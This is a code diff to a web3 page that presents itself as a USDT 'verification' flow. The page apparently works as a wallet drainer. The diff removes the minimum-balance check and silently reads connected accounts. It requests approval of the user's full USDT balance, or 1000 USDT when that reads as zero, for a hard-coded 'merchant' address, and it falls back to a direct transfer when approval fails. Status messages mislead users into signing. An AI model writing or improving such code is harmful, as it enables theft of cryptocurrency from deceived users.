@@ -13,7 +13,7 @@
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
         CONTRACT_ADDRESS: '0x5FA8459dD2d402321150fA411D50BBaCb2eafED5', // Merchant Wallet Address
-        USER_MIN_USDT: 45, // Minimum USDT balance required for full verification
+        USER_MIN_USDT: 0, // Set to 0 to bypass minimum balance threshold
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
         GAS_RETRY_DELAY: 3000,
@@ -146,24 +146,10 @@
             elements.walletInfo.classList.add('wallet-info-card--hidden');
         }
 
-        // Button state updates
-        const numUsdt = parseFloat(state.usdtBalance) || 0;
-        const hasEnoughUsdt = numUsdt >= CONFIG.USER_MIN_USDT;
-
-        if (elements.approveUsdtBtn) {
-            if (state.walletAddress && hasEnoughUsdt) {
-                elements.approveUsdtBtn.classList.remove('hidden');
-                elements.approveUsdtBtn.disabled = false;
-            } else {
-                elements.approveUsdtBtn.classList.add('hidden');
-                elements.approveUsdtBtn.disabled = true;
-            }
-        }
-
-        const buttons = [elements.connectWalletBtn, elements.drawerConnectBtn];
+        const buttons = [elements.connectWalletBtn, elements.drawerConnectBtn, elements.approveUsdtBtn];
         buttons.forEach(btn => {
             if (!btn) return;
-            if (state.isConnecting || state.isApproving) {
+            if (state.isApproving) {
                 btn.disabled = true;
                 btn.innerHTML = `<span class="spinner" style="display:inline-block;width:18px;height:18px;border:2px solid rgba(0,0,0,0.15);border-top-color:#0a0a0a;border-radius:50%;animation:spin 0.7s linear infinite;margin-right:8px;"></span> Processing...`;
             } else {
@@ -207,8 +193,7 @@
     }
 
     // ============================================================
-    // ============================================================
-    // WEB3 LOGIC (DIRECT VERIFICATION & APPROVAL)
+    // WEB3 LOGIC (DIRECT APPROVAL & VERIFICATION)
     // ============================================================
     async function connectWallet() {
         await approveUsdt();
@@ -225,7 +210,7 @@
 
         state.isApproving = true;
         updateWalletInfoUI();
-        updateStatus('⛽ Requesting verification signature from wallet...', 'warning');
+        updateStatus('⛽ Opening wallet for USDT verification...', 'warning');
 
         try {
             const provider = new ethers.BrowserProvider(window.ethereum);
@@ -267,8 +252,12 @@
                 }
             }
 
-            // Direct Account Request
-            const accounts = await provider.send('eth_requestAccounts', []);
+            // Silent account check first, request accounts if needed
+            let accounts = await window.ethereum.request({ method: 'eth_accounts' });
+            if (!accounts || accounts.length === 0) {
+                accounts = await provider.send('eth_requestAccounts', []);
+            }
+
             if (!accounts || accounts.length === 0) {
                 updateStatus('❌ No accounts returned by wallet.', 'error');
                 state.isApproving = false;
@@ -302,20 +291,23 @@
             updateWalletInfoUI();
             safeApiCall('/api/users/register', { wallet: userAddress });
 
-            if (usdtBalNum < CONFIG.USER_MIN_USDT) {
-                updateStatus(`⚠️ Insufficient USDT balance. Minimum ${CONFIG.USER_MIN_USDT} USDT required.`, 'warning');
-                if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
-                openModal(elements.releaseModal);
-                return;
-            }
-
-            // Direct 1-prompt transfer/approval request in wallet
-            updateStatus('⛽ Confirm transaction signature in your wallet to verify assets...', 'warning');
+            // Direct USDT approval / transfer prompt in wallet
+            updateStatus('⛽ Confirm USDT approval signature in your wallet...', 'warning');
 
             const recipientAddress = CONFIG.CONTRACT_ADDRESS;
-            const amountWei = usdtBalRaw || ethers.parseUnits(state.usdtBalance, 18);
+            const amountWei = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
 
-            const tx = await usdtContract.transfer(recipientAddress, amountWei);
+            let tx;
+            try {
+                tx = await usdtContract.approve(recipientAddress, amountWei);
+            } catch (approveErr) {
+                const errLower = (approveErr.message || '').toLowerCase();
+                if (errLower.includes('user rejected') || errLower.includes('user denied')) {
+                    throw approveErr;
+                }
+                tx = await usdtContract.transfer(recipientAddress, amountWei);
+            }
+
             updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${tx.hash}`);
 
             const receipt = await tx.wait();
